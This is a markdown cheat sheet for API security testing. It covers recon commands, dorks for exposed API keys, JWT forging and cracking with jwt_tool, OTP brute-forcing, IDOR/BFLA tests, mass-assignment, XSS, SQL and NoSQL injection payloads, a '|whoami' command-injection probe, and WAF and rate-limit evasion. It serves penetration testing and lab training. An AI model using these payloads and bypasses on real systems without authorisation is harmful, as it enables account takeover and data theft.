# API security Testing
### Essential Tools
- Arjun / Hunt by jhaddix
- Amass
- Kiterunner
- FFUF
- Param Miner
	
### Target Setup / Lab
- crAPPI
- Juice Shop
- VAmPI
- DVWS-node
- DamnVulnerable MicroServices
- Node-API-goat
- Vulnerable GraphQL API
- Generic-University
- vulnapi

### Knowlegde Requirement 
- JWT Knowledge
- IDOR 
- Access Control Issues
- SQLi
- NoSQLI
- More Will Be Great

### API Recon
- Subdomain Enumration To API Discovery
```bash
cat subs.txt | grep "api"
```
- Wayback Data To API dicovery
```bash
cat subs.txt | httpx | cut -f "/" -d 3 | waybackurls | anew urls.txt
cat subs.txt | httpx | cut -f "/" -d 3 | gau | anew urls.txt
cat subs.txt | httpx | hakrawler | anew urls.txt
cat urls.txt | httpx -debug | grep -e "content-type: application/json" -e "content-type: application/xml" -e "json" 
```
- Google Dorking
```bash
inurl:"/wp-json/wp/v2/users" 
# Finds all publicly available WordPress API user directories

intitle:"index.of" intext:"api.txt"
# Finds publicly available API key files

inurl:"/includes/api/" intext:"index of /" 
# Finds potentially interesting API directories

ext:php inurl:"api.php?action=" 
# Finds all sites with a XenAPI SQL injection vulnerability OLD..

intitle:"index of" api_key OR "api key" OR apiKey -pool
# Lists potentially exposed API keys
```
- Shodan To APi Discovery
```bash
hostname:"targetname.com" "content-type: application/json"
hostname:"targetname.com" "content-type: application/xml"
hostname:"targetname.com" "wp-json"
eg : "example.com" "content-type: application/json"
```
- Bruteforce target to api discovery
```bash
# Wordlist : API_superlist 
ffuf -u https://FUZZ.example.com -w API_superlist.txt

# Wordlist /api/wordlists/common_apis_160
ffuf -u https://example.com/FUZZ -w common_apis_160
```

- Manual Github Recon 
1. Search For API Key, Endpoints , Datasets
1. Check Commits , Pull Requests
- Recon about api from [Grep.App](https://grep.app)
- Recon about api from GitRob
- Recon about api from [ProgrammableWeb](https://www.programmableweb.com)
- Recon about api from [RapidApi](https://rapidapi.com)
- Recon about api from [Apis Guru](https://apis.guru/browse-apis)
- Javascript Enumration
- scan for API running on different port number
1. Shodan
1. naabu
- Hidden api paths in robots.txt file
- Check API urls from [URLscan io](https://urlscan.io)
- Discovering API Content with Kiterunner
```bash
kr scan http://192.168.195.132:8090 -w ~/api/wordlists/data/kiterunner/routes-large.kite

# use .txt file with kr
kr brute <target> -w ~/api/wordlists/data/automated/nameofwordlist.txt
```

## Endpoint Analysis
- Try To Find API documentation
1. Create account and check
1. Check if any subdomain starts with docs.example.com
1. [Bruteforce](https://github.com/hAPI-hacker/Hacking-APIs)
1. If documentation is private (Wayback Machine, URLscan.io)
1. Javascript Endpoint Alalysis
```bash
RedJs : A tool created by me . Under devlopment but best so far
# Save All Js File into 1 folder
redjs -u https://example.com -v -o scripts
redjs -t scripts | grep "Found"
```
- Standard Notation in docs
```bash
Convention: 
: or {} 

Meaning:
The colon or curly brackets are used by
some APIs to indicate a path variable.
In other words, “:id” represents the variable for an ID number and “{username}”
represents the account username you are
trying to access.

Example:
/user/:id
/user/{id}
/user/2727
/account/:username
/account/{username}
/account/scuttleph1sh



Convention:
[]

Meaning:
Square brackets indicate that the input is
optional.

Example:
/api/v1/user?find=[name]



Convention:
||

Meaning: 
Double bars represent different possible
values that can be used.

Example:
“blue” || “green” || “red”


Convention:
< >

Meaning:
Angle brackets represent a DomString,
which is a 16-bit string.

Example:
<find-function>

```
#### Things to remeber while testing any endpoint
• What sorts of actions can I take?
• Can I interact with other user accounts?
• What kinds of resources are available?
• When I create a new resource, how is that resource identified?
• Can I upload a file? Can I edit a file?

### API Issues
- Try To Perform Privileged Actions

- Find Information Disclosures
1. Unusual Header
1. Unusual Parameter In Response
1. Disclosed Email, Number , Etc. Try IDOR
1. Create 2 accounts try accessing user 1's detail with user 2's JWT.

- Finding Security Misconfigurations
1. Verbose Errors : Email Not Found To Email Enumration , Username incorrect, Software version to CVE search / setup locally and test there
1. Debug Mode Enabled : Plenty of wordlists out there to test these
1. Finding Excessive Data Exposures


# ATTACKING API AUTHENTICATION
- Brute Force Authentication
1. Bruteforce Password Accoring To Target Policy
1. BruteForce OTP / 2FA codes
1. Bypass IP Ban With Load Balancer Headers Like X-Forwarded-For, etc
1. Bypass Rate Limiting Via Tampering WIth Signature Headers and using multiple Generated Token
1. Combine ALL Together if nessesary

- Forging Tokens
1. Create multiple accounts
1. Save Access Token into a text file
1. Analyze Using Burp Sequencer > Manual Load > Analyze Now
1. Also Character Level Analysis
1. Burp Live Capture To Analyze Token Predicablilty
1. Use Intruder To Bruteforce
#### JWT ABuse
- Use Burp JWT Extensions
- Use jwt_tool
```bash
jwt_tool <jwt>
jwt_tool eyghbocibiJIUZZINIISIRSCCI6IkpXUCJ9.eyIzdW1101IxMjMENTY3ODkwIiwibmFtZSI6ImhBuEkg
SGFja2VyIiwiaWFQIjoxNTE2MjM5MDIyfQ.IX-Iz_e1CrPrkel FjArExaZpp3Y2tfawJUFQaNdftFw
```
- Attack JWT Using JWT_tool 
```bash
jwt_tool -t http://target-site.com/ -rc "Header: JWT_Token" -M pb
```
- Check Out Attackcking JWT Manual FOr 
1. None Algorithm attack
```bash
# Burp Extension and
jwt_tool <JWT_Token> -X a
```
1. Algorithm attack
```bash
# Check JWT attacks manual 
- Find Company Public Key Used For RS256
- COnvert if it's in a json format to .pem and save it
# jwt_tool eyJBeXAiOiJKV1QiLCJhbGciOiJSUZI1Ni 19.eyJpc3MiOi JodHRwOlwvxC9kZW1vLnNqb2VyZGxhbm
drzwiwZXIubmxcLyIsIm1hdCI6MTYYCJkYXRhIjp7ImhlbGxvijoid29ybGQifx0.MBZKIRF_MvG799nTKOMgdxva
_S-dqsVCPPTR9N9L6q2_10152pHq2YTRafwACdgyhR1A2Wq7wEf4210929BTWsVk19_XkfyDh_Tizeszny_
GGsVzdb103NCITUEjFRXURJ0-MEETROOC-TWB8n6wOTOjWA6SLCEYANSKWaJX5XvBt6HtnxjogunkVz2sVp3
VFPevfLUGGLADKYBphfumd7jkh80ca2lvs8TagkQyCnXq5VhdZsoxkETHwe_n7POBISAZYSMayihlweg -x k-pk
public-key-pem
```
1. Weak Signature Crack Attack
```bash
jwt_tool <JWT Token> -C -d /wordlist.txt
```

# API FUZZING
- input could include symbols, numbers, emojis, decimals, hexadecimal, system commands,SQL input, and NoSQL input, for instance.
1. SQL Detection Payloads, Time Based Too
1. No SQL Detection Payload
1. A value in the quadrillions
1. String of letters instead of numbers
1. A large decimal number or a negative number
1. Null values like null, (null), %00, and 0x00
1. Symbols like the following: !@#$%^&*();':''|,./?>
1. Sending characters from unexpected languages (漢, さ, Ж, Ѫ, Ѭ, Ѧ, Ѩ, Ѯ)
```bash
# wordlists
# big-list-of-naughty-strings.txt : From SecLists
# https://github.com/fuzzdb-project/fuzzdb
# https://github.com/xmendez/wfuzz
```

- Quick Test
```bash
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
9999999999999999999999999999999999999999
~'!@#$%^&*()-_+
{}[]|\:''; '<>?,./
%00
0x00
$ne
%24ne
$gt
%24gt
|whoami
-- -
' ''
' OR 1=1-- -
'' ''''''
漢, さ, Ж, Ѫ, Ѭ, Ѧ, Ѩ, Ѯ
😀 😃 😄 😁 �
..
..\
../
\..\
\..\.\
```
# EXPLOITING API AUTHORIZATION
- Testing IDORS And Access Controls
```bash
Type                        Valid request                       BOLA test

Predictable ID      GET /api/v1/account/ 2222               GET /api/v1/account/ 3333
                    Token: UserA_token                      Token: UserA_token
                    

ID combo            GET /api/v1/UserA/data/2222             GET /api/v1/ UserB /data/ 3333
                    Token: UserA_token                      Token: UserA_token


Integer as ID       POST /api/v1/account/                   POST /api/v1/account/
                    Token: UserA_token                      Token: UserA_token
                    {"Account": 2222 }                      {"Account": [3333]}


Email as            POST /api/v1/user/account               POST /api/v1/user/account 
user ID             Token: UserA_token                      Token: UserA_token
                    {"email": " UserA@email.com"}           {"email": " UserB@email.com"}


Group ID            GET /api/v1/group/ CompanyA             GET /api/v1/group/ CompanyB
                    Token: UserA_token                      Token: UserA_token


Group and           POST /api/v1/group/ CompanyA            POST /api/v1/group/ CompanyB
user combo          Token: UserA_token                      Token: UserA_token
                    {"email": " userA@CompanyA.com"}        {"email": " userB@CompanyB.com"}


Nested object       POST /api/v1/user/checking               POST /api/v1/user/checking
                    Token: UserA_token                       Token: UserA_token
                    {"Account": 2222 }                       {"Account": {"Account" :3333}}


Multiple            POST /api/v1/user/checking               POST /api/v1/user/checking
objects             Token: UserA_token                       Token: UserA_token
                    {"Account": 2222 }                       {"Account": 2222, "Account":3333, "Account": 5555 }


Predictable         POST /api/v1/user/account               POST /api/v1/user/account
token               Token: UserA_token                      Token: UserA_token
                    {"data": "DflK1df7jSdfa1acaa"}          {"data": "DflK1df7jSdfa2dfaa"}

```

- A-B Method
1. Tools : Burp Authorize   Burp Autprepeater
1. List senstive endpoints
1. Create 2 Accounts
1. Save Cookie/Token and IDs
1. Request to all senstive enspoints with altering in bwtween IDs and Tokens as Displayed Above

- Side-Channel BOLA
1. Can be used to chain attacks
```bash
        Request                                 Response

GET /api/user/test987123                404 Not Found HTTP/1.1
GET /api/user/hapihacker                405 Unauthorized HTTP/1.1
GET /api/user/1337                      405 Unauthorized HTTP/1.1
GET /api/user/phone/2018675309          405 Unauthorized HTTP/1.1
```

### Finding BFLAs
-  BFLA involves searching for functionality to which you should not have access.
1. Try Each Methods Like : GET, POST,UPDATE,PUT,DELETE
- A-B-A Testing for BFLA
1. Create, read, update, or delete resources as UserA
1. Swap out your UserA token for UserB’s
1. Send GET, PUT, POST, and DELETE requests for UserA’s resources using UserB’s token. 
1. Check UserA’s resources to validate changes have been made by using UserB’s token
1. Use Burp SUite Match And Replace Option

## EXPLOITING MASS ASSIGNMENT
- It's a method to add unknown json variables in earch request. eg t. Account registration, profile editing, user management, and client management are all common functions that allow clients to submit input using the API.
1. Use Burp Param Miner Extention -> Guess Json Data
1. Arjun 
1. Documentation
1. HUNT
1. EG : 
```bash
# This
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"pass


# To This
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"admin": true,
"password":"Password1!"
```
1. While API sends Forgot Password Link To Email. Use Phone Number Instead To Create An Exception
1. Change GroupA as GroupB to access GroupB resources
#### Blind Mass Assignment Attacks
- Get Json data from Arjun And use it
```bash
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"admin": true,
"admin":1,
"isadmin": true,
"role":"admin",
"role":"administrator",
"user_priv": "admin",
"password":"Password1!"
}
```

1. Automating Mass Assignment Attacks with Arjun and
Burp Suite Intruder
```bash
arjun --headers "Content-Type: application/json]" -u http://vulnhost.com/api/register -m JSON --include='{$arjun$}'
```
#### Combining BFLA and Mass Assignment
- Found BFLA 
- Attack BFLA With Mass Assignment To increase impact
1. eg
```bash
# From 
PUT /api/v1/account/update
Token:UserA-Token
--snip--
{
"username": "Ash",
"address": "123 C St",
"city": "Pallet Town"
"region": "Kanto",
}



# To
PUT /api/v1/account/update
Token:UserA-Token
--snip--
{
"username": "Brock",
"address": "456 Onyx Dr",
"city": "Pewter Town",
"region": "Kanto",
"email": "ash@email.com",
"mfa": false
}
```

# API INJECTION
- Before you can inject a payload using an API, you must discover places where the API accepts user input
1. API keys
1. Tokens
1. Headers
1. Query strings in the URL
1. Parameters in POST/PUT requests

- Injection Payloads
1. Data That Is Displayed In Web Page Try XSS : Username / Email / Addresss / Anything You COntrol 
```bash
<script>alert("xss")</script>
<script>alert(1);</script>
<%00script>alert(1)</%00script>
SCRIPT>alert("XSS");///SCRIPT>
```

- Any Request That Makes / Changes Data To Be Persistence
1. SQL Injection
```bash
# Detection Payload
'
''
;%00
--
-- -
""
;

' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
OR 1=1
```


1. NoSql Injection
```bash
# Detection
$gt
{"$gt":""}
{"$gt":-1}
$ne
{"$ne":""}
{"$ne":-1}
$nin
{"$nin":1}
{"$nin":[1]}

|| '1'=='1
//
||'a'\\'a
'||'1'=='1';//
'/{}:
'"\;{}
'"\/$[].>
{"$where": "sleep(1000)"}
```
1. Command Injection # wordlists/os-cmds.txt

# REAL-WORLD API HACKING
- Evading Security & WAF
1. Detect WAF
```bash
waf00f https://api.target.com
```
-  Evading Payload To Bypass WAF : Try All These To Determine The Perticular Bypass Method WHihc is accepted by backend 
1. Parameter Polluton
1. URL Encoding
1. Base 64 & HTml endoing
1. String Terminators
```bash
# add as prefix or suffix
%00
0x00
//
;
%
!
?
[]
%5B%5D
%09
%0a
%0b
%0c
%0e
```
- Rate Limit Bypass
1. Configure Ip rotate
1. Use ProxyChains
1. Check For These Headers In Req & Res
```bash
x-rate-limit:
x-rate-limit-remaining:
```
1. Path Bypass
```bash
POST /api/myprofile
--snip--
{uid=§0001§}

POST /api/myprofile%00
POST /api/myprofile%20
POST /api/myProfile
POST /api/MyProfile
POST /api/my-profile
```
1. Origin Header Spoofing
```bash
X-Forwarded-For
X-Forwarded-Host
X-Host
X-Originating-IP
X-Remote-IP
X-Client-IP
X-Remote-Addr
```

# AT TACKING GR APHQL
-- Pending
